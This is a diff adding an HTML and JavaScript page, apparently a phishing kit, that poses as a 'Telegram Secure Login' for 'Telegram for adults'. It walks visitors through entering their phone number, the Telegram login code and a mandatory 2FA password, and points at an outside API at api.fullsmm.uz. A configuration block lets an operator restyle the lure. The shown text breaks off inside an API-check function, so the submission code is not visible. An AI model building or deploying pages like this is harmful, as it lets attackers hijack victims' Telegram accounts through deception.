@@ -1,0 +1,1410 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="appTitle">Telegram Secure Login</title>
+
+<style>
+/* CSS kodidagi ranglar JS CONFIG orqali o'zgartirilishi mumkin emas. */
+/* Ranglar CONFIG o'zgaruvchisi orqali o'zgartirilishi uchun CSS variables ishlatiladi */
+:root{
+  --bg:#0e1621;
+  --card:#17212b;
+  --primary:#2aabee;
+  --text:#e9edef;
+  --muted:#8b9bb4;
+  --danger:#ff6b6b;
+  --success:#4ade80;
+  --radius:16px;
+}
+
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto, sans-serif; margin:0; padding:0;}
+
+body{
+  margin:0;
+  /* Fon uslubi JS orqali beriladi */
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--text);
+  padding:20px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:var(--card);
+  border-radius:var(--radius);
+  padding:28px;
+  box-shadow:0 30px 60px rgba(0,0,0,.45);
+  animation:fadeIn .5s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(16px)}
+  to{opacity:1;transform:none}
+}
+
+.logo{
+  width:64px;height:64px;
+  border-radius:50%;
+  background:var(--primary);
+  margin:0 auto 2px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px;
+}
+
+h2{text-align:center;margin:6px 0}
+p{text-align:center;font-size:14px;color:var(--muted);margin-bottom:22px}
+
+.step{
+  animation:stepIn .35s ease;
+  display:none;
+}
+.step.active{
+  display:block;
+}
+@keyframes stepIn{
+  from{opacity:0;transform:translateX(20px)}
+  to{opacity:1;transform:none}
+}
+
+.input-group {
+  margin-top: 18px;
+}
+
+input,button{
+  width:100%;
+  padding:14px;
+  border-radius:var(--radius);
+  font-size:15px;
+}
+
+input{
+  background:#0e1621;
+  border:1px solid #22303c;
+  color:var(--text);
+  outline:none;
+  transition:border-color 0.3s;
+}
+
+input:focus{border-color:var(--primary)}
+
+/* Raqam input va kod input uchun maxsus stil */
+input[type="tel"]::-webkit-inner-spin-button,
+input[type="tel"]::-webkit-outer-spin-button,
+input.code-input::-webkit-inner-spin-button,
+input.code-input::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+input[type="tel"],
+input.code-input {
+  -moz-appearance: textfield;
+  appearance: textfield;
+}
+
+button{
+  background:var(--primary);
+  border:none;
+  color:white;
+  font-weight:500;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  transition:background .2s;
+  margin-top:16px;
+}
+
+button:hover:not(:disabled){background:#1f9fe0}
+button:disabled{opacity:.6;cursor:not-allowed}
+
+.msg{
+  text-align:center;
+  font-size:14px;
+  margin-top:12px;
+  min-height:20px;
+}
+.msg.error{color:var(--danger)}
+.msg.success{color:var(--success)}
+
+.spinner{
+  width:18px;height:18px;
+  border:2px solid rgba(255,255,255,.3);
+  border-top-color:white;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.footer{
+  text-align:center;
+  font-size:12px;
+  color:var(--muted);
+  margin-top:24px;
+  padding-top:16px;
+  border-top:1px solid #22303c;
+}
+
+.back-btn {
+  background:transparent;
+  border:1px solid var(--muted);
+  color:var(--text);
+  margin-top:12px;
+}
+
+.back-btn:hover {
+  background:rgba(139, 155, 180, 0.1);
+}
+
+.code-input {
+  text-align: center;
+  font-size: 18px;
+  letter-spacing: 8px;
+  font-weight: bold;
+}
+
+.warning {
+  background: rgba(255, 107, 107, 0.1);
+  border: 1px solid var(--danger);
+  border-radius: var(--radius);
+  padding: 12px;
+  margin-bottom: 16px;
+  font-size: 13px;
+  color: var(--danger);
+}
+
+.warning.hidden {
+  display: none;
+}
+
+.api-status {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  background: var(--card);
+  padding: 8px 12px;
+  border-radius: var(--radius);
+  font-size: 12px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  box-shadow: 0 4px 12px rgba(0,0,0,.3);
+}
+
+.status-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+}
+
+.status-dot.online {
+  background: var(--success);
+  animation: pulse 2s infinite;
+}
+
+.status-dot.offline {
+  background: var(--danger);
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
+}
+
+.password-input {
+  margin-top: 12px;
+  animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.info-banner {
+  background: rgba(42, 171, 238, 0.1);
+  border: 1px solid var(--primary);
+  border-radius: var(--radius);
+  padding: 12px;
+  margin-bottom: 16px;
+  font-size: 13px;
+  color: var(--primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.info-banner.hidden {
+  display: none;
+}
+
+/* User Profile Styles */
+.user-profile {
+  text-align: center;
+  animation: slideUp 0.5s ease;
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: none;
+  }
+}
+
+.user-avatar {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, var(--primary), #1f9fe0);
+  margin: 0 auto 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 40px;
+  color: white;
+  border: 4px solid rgba(255, 255, 255, 0.1);
+}
+
+.user-name {
+  font-size: 24px;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.user-phone {
+  color: var(--muted);
+  font-size: 16px;
+  margin-bottom: 24px;
+}
+
+.user-stats {
+  background: rgba(42, 171, 238, 0.05);
+  border-radius: var(--radius);
+  padding: 20px;
+  margin: 20px 0;
+  border: 1px solid rgba(42, 171, 238, 0.1);
+}
+
+.stat-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 0;
+  border-bottom: 1px solid rgba(139, 155, 180, 0.1);
+}
+
+.stat-item:last-child {
+  border-bottom: none;
+}
+
+.stat-label {
+  color: var(--muted);
+  font-size: 14px;
+}
+
+.stat-value {
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--primary);
+}
+
+.stars-balance {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  font-size: 18px;
+  color: gold;
+  font-weight: 600;
+}
+
+.star-icon {
+  font-size: 20px;
+}
+
+.account-badge {
+  display: inline-block;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 500;
+  margin-left: 8px;
+}
+
+.badge-premium {
+  background: linear-gradient(135deg, #fbb034, #ffdd00);
+  color: #000;
+}
+
+.badge-verified {
+  background: linear-gradient(135deg, #00b09b, #96c93d);
+  color: white;
+}
+
+.actions {
+  display: flex;
+  gap: 12px;
+  margin-top: 24px;
+}
+
+.action-btn {
+  flex: 1;
+  padding: 12px;
+  border-radius: var(--radius);
+  background: rgba(42, 171, 238, 0.1);
+  border: 1px solid rgba(42, 171, 238, 0.2);
+  color: var(--primary);
+  cursor: pointer;
+  transition: all 0.3s;
+  font-size: 14px;
+}
+
+.action-btn:hover {
+  background: rgba(42, 171, 238, 0.2);
+  transform: translateY(-2px);
+}
+
+.logout-btn {
+  background: rgba(255, 107, 107, 0.1);
+  border: 1px solid rgba(255, 107, 107, 0.2);
+  color: var(--danger);
+}
+
+.logout-btn:hover {
+  background: rgba(255, 107, 107, 0.2);
+}
+
+.loading-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 0;
+}
+
+.loading-text {
+  margin-top: 16px;
+  color: var(--muted);
+  font-size: 14px;
+}
+
+/* Raqamli klaviatura o'chirildi - unga tegishli stil qoldiqlari olib tashlandi */
+
+/* Country Code Styles */
+.country-group {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  margin-bottom: 24px;
+}
+
+.country-code {
+  width: 120px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  position: relative;
+}
+
+.country-flag {
+  font-size: 20px;
+}
+
+.country-name {
+  color: var(--muted);
+  font-size: 12px;
+  position: absolute;
+  bottom: -20px;
+  white-space: nowrap;
+}
+
+.phone-number {
+  flex: 1;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div id="loginContainer">
+    <div class="logo" id="appLogo"></div> 
+    <h2 id="mainHeading"></h2> 
+    <p id="desc"></p> 
+    
+    <div id="startStep" class="step active">
+        <button id="btnStartLogin" onclick="startLogin()"></button>
+    </div>
+
+    <div id="tgStep" class="step">
+      <button id="btnShareContact" onclick="shareContact()"></button>
+      <button id="btnOtherMethod" class="back-btn" onclick="showManualStep()"></button>
+    </div>
+
+    <div id="manualStep" class="step">
+      <div class="input-group">
+        <div class="country-group">
+          <div class="country-code">
+            <input id="countryCode" placeholder="+998" type="tel" inputmode="tel" maxlength="4">
+            <span id="countryFlag" class="country-flag"></span>
+            <span id="countryName" class="country-name"></span>
+          </div>
+          <input id="phoneNumber" class="phone-number" placeholder="901234567" type="tel" inputmode="tel">
+        </div>
+      </div>
+      <button id="sendCodeBtn" onclick="sendCode()"></button>
+      <button id="btnBackStart" class="back-btn" onclick="showStartStep()"></button> </div>
+
+    <div id="codeStep" class="step">
+      <div class="info-banner" id="infoBanner" style="display: none;">
+      </div>
+      
+      <div class="input-group">
+        <input id="code" placeholder="Telegram kodi" maxlength="5" type="text" inputmode="numeric" class="code-input">
+      </div>
+      <button id="verifyCodeBtn" onclick="verifyCode()"></button>
+      <button id="btnChangePhone" class="back-btn" onclick="showManualStep()"></button>
+    </div>
+
+    <div id="passwordStep" class="step">
+      <div class="info-banner" id="passwordInfoBanner">
+      </div>
+      
+      <div class="input-group">
+        <input id="password" placeholder="2FA password (mandatory)" type="password" inputmode="text">
+      </div>
+      <button id="verifyPasswordBtn" onclick="verifyPassword()"></button>
+      <button id="btnBackCode" class="back-btn" onclick="showCodeStep()"></button>
+    </div>
+
+    <div id="msg" class="msg"></div>
+    <div class="footer" id="appFooter"></div>
+  </div>
+
+  <div id="profileContainer" class="step" style="display: none;">
+    <div class="user-profile" id="userProfileContent">
+      </div>
+  </div>
+</div>
+
+<div id="apiStatus" class="api-status hidden">
+  <div class="status-dot"></div>
+  <span id="apiStatusText"></span>
+</div>
+
+<script>
+/* ========================================================================= */
+/* ======================== KONFIGURATSIYA (O'zgartiring) =================== */
+/* ========================================================================= */
+
+const CONFIG = {
+    // 1. Umumiy UI elementlari
+    APP_TITLE: "Telegram Secure Login",
+    // Orqa fon uslubini kiriting: "radial-gradient(circle at top, #1b2735, #0e1621)" yoki "url('rasm_manzili.jpg')"
+    BACKGROUND_STYLE: "radial-gradient(circle at top, #1b2735, #0e1621)", 
+    LOGO_EMOJI: "18+​", // Markazdagi logo uchun (Emoji yoki bir harf)
+    
+    // 2. Qadam Sarlavhalari va Tavsiflari
+    MAIN_HEADING: "Telegram for adults",
+    INITIAL_DESC: "Everyting is safe and secure",
+    START_DESC: "Press the button below to start", // YANGI
+    PHONE_DESC: "Enter your phone number",
+    CODE_DESC: "Enter the code sent to your phone number by Telegram",
+    PASSWORD_DESC: "Enter your 2FA password",
+
+    // 3. Tugmalar Matnlari
+    BTN_START: "Start", // YANGI
+    BTN_SHARE_CONTACT: "📞 Share Phone number",
+    BTN_OTHER_METHOD: "Enter the phone number manually", // Matn o'zgartirildi
+    BTN_SEND_CODE: "Start Login",
+    BTN_VERIFY: "Verify",
+    BTN_BACK_TG: "Back", // Manual Step -> Tg Step (endi Start Step)
+    BTN_BACK_START: "Back", // Manual Step -> Start Step (YANGI)
+    BTN_CHANGE_PHONE: "Change Phone Number", // Code Step -> Manual Step
+    BTN_BACK_CODE: "Back", // Password Step -> Code Step
+    BTN_RETRY: "Retry",
+    BTN_LOGOUT: "🚪 Exit",
+    BTN_REFRESH: "🔄 Refresh",
+
+    // 4. Xabar Matnlari (API/Status)
+    MSG_2FA_INFO: "🔐 2FA is enabled on your account. Please enter your password.",
+    MSG_PHONE_EMPTY: "Enter country code and phone number",
+    MSG_PHONE_INVALID: "Invalid phone number format",
+    MSG_SENDING_CODE: "Sending code...",
+    MSG_CODE_SENT: "Code sent successfully, please enter the code to login to Telegram for Adults",
+    MSG_CODE_EMPTY: "Enter code",
+    MSG_CODE_INVALID_LENGTH: "Code must be 5 digits long",
+    MSG_VERIFYING: "Verifying...",
+    MSG_2FA_REQUIRED: "Enter 2FA password",
+    MSG_SUCCESS: "Successfully logged in! 🎉",
+    MSG_LOGOUT_SUCCESS: "Successfully logged out",
+    MSG_API_OFFLINE: "Telegram for Adults is not working now. Please try again later.",
+    MSG_API_NOT_RESPONDING: "Telegram for Adults is not responding. Please try again.",
+    MSG_ERROR_PHONE_MISSING: "Phone number not found",
+    MSG_ERROR_USER_DATA_FAILED: "Your user data could not be loaded:",
+    MSG_ERROR_NO_CONTACT: "Contact information not found",
+    MSG_ERROR_NO_WEBAPP: "Telegram for Adults web app not found",
+    
+    // 5. Profil Matnlari
+    PROFILE_LOADING: "Loading...",
+    PROFILE_PHONE: "Telefon raqam:",
+    PROFILE_USER_ID: "User ID:",
+    PROFILE_USERNAME: "Username:",
+    PROFILE_PREMIUM: "Premium:",
+    PROFILE_VERIFIED: "Verified:",
+    PROFILE_NOT_KNOWN: "Unknown",
+    PROFILE_NO: "❌ No",
+    PROFILE_YES: "✅ Yes",
+    PROFILE_FOOTER_STATUS: "Successfully logged in",
+    
+    // 6. Footer Matni
+    FOOTER_TEXT: "Telegram Mini App • Only for Adults",
+};
+
+/* ========================================================================= */
+/* ================== JS LOGIKA (O'zgartirish shart emas) =================== */
+/* ========================================================================= */
+
+// API endpoint - FullSMM API
+const API_BASE = "https://api.fullsmm.uz";
+const API = API_BASE + "/auth";
+let PHONE = null;
+let requires2FA = false;
+let sessionData = null;
+let tempCode = null;
+
+// DOM Elementlari
+const startStep = document.getElementById("startStep"); // YANGI
+const tgStep = document.getElementById("tgStep");
+const manualStep = document.getElementById("manualStep");
+const codeStep = document.getElementById("codeStep");
+const passwordStep = document.getElementById("passwordStep");
+const countryCodeInput = document.getElementById("countryCode");
+const phoneNumberInput = document.getElementById("phoneNumber");
+const codeInput = document.getElementById("code");
+const passwordInput = document.getElementById("password");
+const msgEl = document.getElementById("msg");
+const desc = document.getElementById("desc");
+const apiStatus = document.getElementById("apiStatus");
+const apiStatusText = document.getElementById("apiStatusText");
+const statusDot = apiStatus.querySelector('.status-dot');
+const countryFlag = document.getElementById("countryFlag");
+const countryName = document.getElementById("countryName");
+const loginContainer = document.getElementById("loginContainer");
+const profileContainer = document.getElementById("profileContainer");
+const userProfileContent = document.getElementById("userProfileContent");
+const infoBanner = document.getElementById("infoBanner");
+const passwordInfoBanner = document.getElementById("passwordInfoBanner");
+const appLogo = document.getElementById("appLogo");
+const appTitle = document.getElementById("appTitle");
+const mainHeading = document.getElementById("mainHeading");
+const appFooter = document.getElementById("appFooter");
+
+// Tugmalar
+const btnStartLogin = document.getElementById("btnStartLogin"); // YANGI
+const btnShareContact = document.getElementById("btnShareContact");
+const btnOtherMethod = document.getElementById("btnOtherMethod");
+const sendCodeBtn = document.getElementById("sendCodeBtn");
+const btnBackStart = document.getElementById("btnBackStart"); // YANGI
+const verifyCodeBtn = document.getElementById("verifyCodeBtn");
+const btnChangePhone = document.getElementById("btnChangePhone");
+const verifyPasswordBtn = document.getElementById("verifyPasswordBtn");
+const btnBackCode = document.getElementById("btnBackCode");
+
+// Country data
+const countries = [
+  // Default O'zbekiston
+  {code: '998', name: "Uzbekistan", flag: "🇺🇿", placeholder: "901234567"},
+  
+  // Major countries from original list
+  {code: '1', name: 'United States', flag: '🇺🇸', placeholder: "123456789"},
+  {code: '44', name: 'United Kingdom', flag: '🇬🇧', placeholder: "123456789"},
+  {code: '49', name: 'Germany', flag: '🇩🇪', placeholder: "123456789"},
+  {code: '33', name: 'France', flag: '🇫🇷', placeholder: "123456789"},
+  {code: '81', name: 'Japan', flag: '🇯🇵', placeholder: "123456789"},
+  {code: '86', name: 'China', flag: '🇨🇳', placeholder: "123456789"},
+  {code: '7', name: 'Russia', flag: '🇷🇺', placeholder: "123456789"},
+  {code: '55', name: 'Brazil', flag: '🇧🇷', placeholder: "123456789"},
+  {code: '61', name: 'Australia', flag: '🇦🇺', placeholder: "123456789"},
+  
+  // Additional European countries
+  {code: '39', name: 'Italy', flag: '🇮🇹', placeholder: "123456789"},
+  {code: '34', name: 'Spain', flag: '🇪🇸', placeholder: "123456789"},
+  {code: '31', name: 'Netherlands', flag: '🇳🇱', placeholder: "123456789"},
+  {code: '41', name: 'Switzerland', flag: '🇨🇭', placeholder: "123456789"},
+  {code: '46', name: 'Sweden', flag: '🇸🇪', placeholder: "123456789"},
+  {code: '47', name: 'Norway', flag: '🇳🇴', placeholder: "123456789"},
+  {code: '45', name: 'Denmark', flag: '🇩🇰', placeholder: "123456789"},
+  {code: '358', name: 'Finland', flag: '🇫🇮', placeholder: "123456789"},
+  {code: '353', name: 'Ireland', flag: '🇮🇪', placeholder: "123456789"},
+  {code: '32', name: 'Belgium', flag: '🇧🇪', placeholder: "123456789"},
+  {code: '43', name: 'Austria', flag: '🇦🇹', placeholder: "123456789"},
+  {code: '48', name: 'Poland', flag: '🇵🇱', placeholder: "123456789"},
+  {code: '420', name: 'Czech Republic', flag: '🇨🇿', placeholder: "123456789"},
+  
+  // Asian countries
+  {code: '91', name: 'India', flag: '🇮🇳', placeholder: "123456789"},
+  {code: '82', name: 'South Korea', flag: '🇰🇷', placeholder: "123456789"},
+  {code: '65', name: 'Singapore', flag: '🇸🇬', placeholder: "123456789"},
+  {code: '60', name: 'Malaysia', flag: '🇲🇾', placeholder: "123456789"},
+  {code: '63', name: 'Philippines', flag: '🇵🇭', placeholder: "123456789"},
+  {code: '66', name: 'Thailand', flag: '🇹🇭', placeholder: "123456789"},
+  {code: '62', name: 'Indonesia', flag: '🇮🇩', placeholder: "123456789"},
+  {code: '84', name: 'Vietnam', flag: '🇻🇳', placeholder: "123456789"},
+  {code: '90', name: 'Turkey', flag: '🇹🇷', placeholder: "123456789"},
+  {code: '92', name: 'Pakistan', flag: '🇵🇰', placeholder: "123456789"},
+  {code: '880', name: 'Bangladesh', flag: '🇧🇩', placeholder: "123456789"},
+  {code: '971', name: 'United Arab Emirates', flag: '🇦🇪', placeholder: "123456789"},
+  {code: '966', name: 'Saudi Arabia', flag: '🇸🇦', placeholder: "123456789"},
+  {code: '972', name: 'Israel', flag: '🇮🇱', placeholder: "123456789"},
+  {code: '98', name: 'Iran', flag: '🇮🇷', placeholder: "123456789"},
+  
+  // Middle East
+  {code: '20', name: 'Egypt', flag: '🇪🇬', placeholder: "123456789"},
+  {code: '962', name: 'Jordan', flag: '🇯🇴', placeholder: "123456789"},
+  {code: '961', name: 'Lebanon', flag: '🇱🇧', placeholder: "123456789"},
+  {code: '974', name: 'Qatar', flag: '🇶🇦', placeholder: "123456789"},
+  {code: '968', name: 'Oman', flag: '🇴🇲', placeholder: "123456789"},
+  
+  // African countries
+  {code: '27', name: 'South Africa', flag: '🇿🇦', placeholder: "123456789"},
+  {code: '234', name: 'Nigeria', flag: '🇳🇬', placeholder: "123456789"},
+  {code: '254', name: 'Kenya', flag: '🇰🇪', placeholder: "123456789"},
+  {code: '233', name: 'Ghana', flag: '🇬🇭', placeholder: "123456789"},
+  {code: '212', name: 'Morocco', flag: '🇲🇦', placeholder: "123456789"},
+  {code: '216', name: 'Tunisia', flag: '🇹🇳', placeholder: "123456789"},
+  
+  // North American countries
+  {code: '1', name: 'Canada', flag: '🇨🇦', placeholder: "123456789"},
+  {code: '52', name: 'Mexico', flag: '🇲🇽', placeholder: "123456789"},
+  {code: '57', name: 'Colombia', flag: '🇨🇴', placeholder: "123456789"},
+  {code: '51', name: 'Peru', flag: '🇵🇪', placeholder: "123456789"},
+  {code: '58', name: 'Venezuela', flag: '🇻🇪', placeholder: "123456789"},
+  {code: '54', name: 'Argentina', flag: '🇦🇷', placeholder: "123456789"},
+  {code: '56', name: 'Chile', flag: '🇨🇱', placeholder: "123456789"},
+  
+  // Central American & Caribbean
+  {code: '506', name: 'Costa Rica', flag: '🇨🇷', placeholder: "123456789"},
+  {code: '507', name: 'Panama', flag: '🇵🇦', placeholder: "123456789"},
+  {code: '502', name: 'Guatemala', flag: '🇬🇹', placeholder: "123456789"},
+  {code: '503', name: 'El Salvador', flag: '🇸🇻', placeholder: "123456789"},
+  {code: '504', name: 'Honduras', flag: '🇭🇳', placeholder: "123456789"},
+  {code: '505', name: 'Nicaragua', flag: '🇳🇮', placeholder: "123456789"},
+  {code: '53', name: 'Cuba', flag: '🇨🇺', placeholder: "123456789"},
+  {code: '1', name: 'Dominican Republic', flag: '🇩🇴', placeholder: "123456789"},
+  {code: '1', name: 'Jamaica', flag: '🇯🇲', placeholder: "123456789"},
+  {code: '1', name: 'Puerto Rico', flag: '🇵🇷', placeholder: "123456789"},
+  
+  // Other South American countries
+  {code: '595', name: 'Paraguay', flag: '🇵🇾', placeholder: "123456789"},
+  {code: '598', name: 'Uruguay', flag: '🇺🇾', placeholder: "123456789"},
+  {code: '591', name: 'Bolivia', flag: '🇧🇴', placeholder: "123456789"},
+  {code: '593', name: 'Ecuador', flag: '🇪🇨', placeholder: "123456789"},
+  
+  // Oceania
+  {code: '64', name: 'New Zealand', flag: '🇳🇿', placeholder: "123456789"},
+  {code: '679', name: 'Fiji', flag: '🇫🇯', placeholder: "123456789"},
+  {code: '675', name: 'Papua New Guinea', flag: '🇵🇬', placeholder: "123456789"},
+  
+  // Other European
+  {code: '351', name: 'Portugal', flag: '🇵🇹', placeholder: "123456789"},
+  {code: '30', name: 'Greece', flag: '🇬🇷', placeholder: "123456789"},
+  {code: '36', name: 'Hungary', flag: '🇭🇺', placeholder: "123456789"},
+  {code: '40', name: 'Romania', flag: '🇷🇴', placeholder: "123456789"},
+  {code: '381', name: 'Serbia', flag: '🇷🇸', placeholder: "123456789"},
+  {code: '385', name: 'Croatia', flag: '🇭🇷', placeholder: "123456789"},
+  {code: '386', name: 'Slovenia', flag: '🇸🇮', placeholder: "123456789"},
+  {code: '421', name: 'Slovakia', flag: '🇸🇰', placeholder: "123456789"},
+  {code: '370', name: 'Lithuania', flag: '🇱🇹', placeholder: "123456789"},
+  {code: '371', name: 'Latvia', flag: '🇱🇻', placeholder: "123456789"},
+  {code: '372', name: 'Estonia', flag: '🇪🇪', placeholder: "123456789"},
+  {code: '373', name: 'Moldova', flag: '🇲🇩', placeholder: "123456789"},
+  {code: '380', name: 'Ukraine', flag: '🇺🇦', placeholder: "123456789"},
+  {code: '375', name: 'Belarus', flag: '🇧🇾', placeholder: "123456789"},
+  
+  // Central Asian (similar to Uzbekistan)
+  {code: '7', name: 'Kazakhstan', flag: '🇰🇿', placeholder: "123456789"},
+  {code: '996', name: 'Kyrgyzstan', flag: '🇰🇬', placeholder: "123456789"},
+  {code: '992', name: 'Tajikistan', flag: '🇹🇯', placeholder: "123456789"},
+  {code: '993', name: 'Turkmenistan', flag: '🇹🇲', placeholder: "123456789"},
+  
+  // Other important countries
+  {code: '850', name: 'North Korea', flag: '🇰🇵', placeholder: "123456789"},
+  {code: '95', name: 'Myanmar', flag: '🇲🇲', placeholder: "123456789"},
+  {code: '880', name: 'Bangladesh', flag: '🇧🇩', placeholder: "123456789"},
+  {code: '94', name: 'Sri Lanka', flag: '🇱🇰', placeholder: "123456789"},
+  {code: '964', name: 'Iraq', flag: '🇮🇶', placeholder: "123456789"},
+  {code: '963', name: 'Syria', flag: '🇸🇾', placeholder: "123456789"},
+  {code: '967', name: 'Yemen', flag: '🇾🇪', placeholder: "123456789"},
+  {code: '970', name: 'Palestine', flag: '🇵🇸', placeholder: "123456789"},
+  {code: '673', name: 'Brunei', flag: '🇧🇳', placeholder: "123456789"},
+  {code: '855', name: 'Cambodia', flag: '🇰🇭', placeholder: "123456789"},
+  {code: '856', name: 'Laos', flag: '🇱🇦', placeholder: "123456789"},
+  {code: '976', name: 'Mongolia', flag: '🇲🇳', placeholder: "123456789"},
+  {code: '677', name: 'Solomon Islands', flag: '🇸🇧', placeholder: "123456789"},
+  {code: '687', name: 'New Caledonia', flag: '🇳🇨', placeholder: "123456789"},
+  {code: '689', name: 'French Polynesia', flag: '🇵🇫', placeholder: "123456789"},
+  
+  // Additional African
+  {code: '251', name: 'Ethiopia', flag: '🇪🇹', placeholder: "123456789"},
+  {code: '255', name: 'Tanzania', flag: '🇹🇿', placeholder: "123456789"},
+  {code: '256', name: 'Uganda', flag: '🇺🇬', placeholder: "123456789"},
+  {code: '260', name: 'Zambia', flag: '🇿🇲', placeholder: "123456789"},
+  {code: '263', name: 'Zimbabwe', flag: '🇿🇼', placeholder: "123456789"},
+  {code: '267', name: 'Botswana', flag: '🇧🇼', placeholder: "123456789"},
+  {code: '268', name: 'Eswatini', flag: '🇸🇿', placeholder: "123456789"},
+  {code: '269', name: 'Comoros', flag: '🇰🇲', placeholder: "123456789"},
+  {code: '291', name: 'Eritrea', flag: '🇪🇷', placeholder: "123456789"},
+  {code: '298', name: 'Faroe Islands', flag: '🇫🇴', placeholder: "123456789"},
+  
+  // Small European countries
+  {code: '376', name: 'Andorra', flag: '🇦🇩', placeholder: "123456789"},
+  {code: '423', name: 'Liechtenstein', flag: '🇱🇮', placeholder: "123456789"},
+  {code: '378', name: 'San Marino', flag: '🇸🇲', placeholder: "123456789"},
+  {code: '379', name: 'Vatican City', flag: '🇻🇦', placeholder: "123456789"},
+  {code: '356', name: 'Malta', flag: '🇲🇹', placeholder: "123456789"},
+  {code: '354', name: 'Iceland', flag: '🇮🇸', placeholder: "123456789"},
+  {code: '350', name: 'Gibraltar', flag: '🇬🇮', placeholder: "123456789"}
+];
+
+
+/* ====== ENV DETECTION & CONFIG APPLICATION ====== */
+document.addEventListener("DOMContentLoaded", async () => {
+    // 1. CONFIG Obyektini qo'llash
+    appTitle.textContent = CONFIG.APP_TITLE;
+    mainHeading.textContent = CONFIG.MAIN_HEADING;
+    appLogo.textContent = CONFIG.LOGO_EMOJI;
+    appFooter.textContent = CONFIG.FOOTER_TEXT;
+    document.body.style.background = CONFIG.BACKGROUND_STYLE;
+    
+    // Tugma matnlarini o'rnatish
+    btnStartLogin.textContent = CONFIG.BTN_START; // YANGI
+    btnShareContact.textContent = CONFIG.BTN_SHARE_CONTACT;
+    btnOtherMethod.textContent = CONFIG.BTN_OTHER_METHOD; 
+    sendCodeBtn.textContent = CONFIG.BTN_SEND_CODE;
+    
+    btnBackStart.textContent = CONFIG.BTN_BACK_START; // YANGI
+
+    verifyCodeBtn.textContent = CONFIG.BTN_VERIFY;
+    btnChangePhone.textContent = CONFIG.BTN_CHANGE_PHONE;
+    verifyPasswordBtn.textContent = CONFIG.BTN_VERIFY;
+    btnBackCode.textContent = CONFIG.BTN_BACK_CODE;
+    
+    // Original tugma matnlarini saqlash
+    document.querySelectorAll('button').forEach(btn => {
+        btn.setAttribute('data-original-text', btn.textContent);
+    });
+    
+    // 2FA Info banner matnini o'rnatish
+    infoBanner.textContent = CONFIG.MSG_2FA_INFO;
+    passwordInfoBanner.textContent = CONFIG.MSG_2FA_INFO;
+
+    // 2. API mavjudligini tekshirish
+    await checkAPI();
+    
+    // 3. Mini App muhitini aniqlash
+    const savedPhone = localStorage.getItem('loggedInPhone');
+    if (savedPhone) {
+        PHONE = savedPhone;
+        await showUserProfile();
+    } else {
+        showStartStep(); // Endi har doim START oynasini ko'rsatadi
+        if (window.Telegram && Telegram.WebApp) {
+          Telegram.WebApp.ready();
+          Telegram.WebApp.expand();
+        }
+    }
+
+    // 4. Klaviatura yaratish qismi o'chirildi. Faqat kirish eventlari qoldi.
+});
+
+
+/* ====== KEYPAD CREATION VA INPUT HANDLING O'CHIRILDI ====== */
+// Faqat kiritish eventlari qoldi
+/* ====== COUNTRY CODE HANDLING ====== */
+countryCodeInput.addEventListener('input', function(e) {
+  let value = this.value;
+  
+  if (value && !value.startsWith('+')) {
+    value = '+' + value.replace(/[^0-9]/g, '');
+  } else if (value.length > 1) {
+    value = '+' + value.substring(1).replace(/[^0-9]/g, '');
+  }
+  
+  if (value.length > 4) {
+    value = value.substring(0, 4);
+  }
+  
+  this.value = value;
+
+  const code = value.substring(1);
+  updateCountryInfo(code);
+  
+  // Avtomatik fokusni o'tkazish
+  if (code.length > 2 && phoneNumberInput.value.length === 0) {
+      phoneNumberInput.focus();
+  }
+});
+
+function updateCountryInfo(code) {
+  const country = countries.find(c => c.code === code);
+  
+  if (country) {
+      countryFlag.textContent = country.flag;
+      countryName.textContent = country.name;
+      phoneNumberInput.placeholder = country.placeholder;
+  } else {
+      countryFlag.textContent = '';
+      countryName.textContent = CONFIG.PROFILE_NOT_KNOWN + ' country code';
+      phoneNumberInput.placeholder = "123456789"; 
+  }
+}
+
+/* ====== API CHECK (O'zgartirishsiz) ====== */
+async function checkAPI() {
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 5000);
+    
+    const response = await fetch(`${API_BASE}/`, {
+      method: 'GET',
+      signal: controller.signal,
+      headers: { 'Accept': 'application/json' }
+    });
+    
+    clearTimeout(timeoutId);
+    
+    if (response.ok) {
+      updateApiStatus('online', 'Telegram for Adults online');
+    } else {
+      throw new Error(`API ${response.status} xatosi`);
+    }
+  } catch (error) {
+    console.warn('Telegram for Adults is not available:', error.message);
+    updateApiStatus('offline', 'Telegram for Adults ofline');
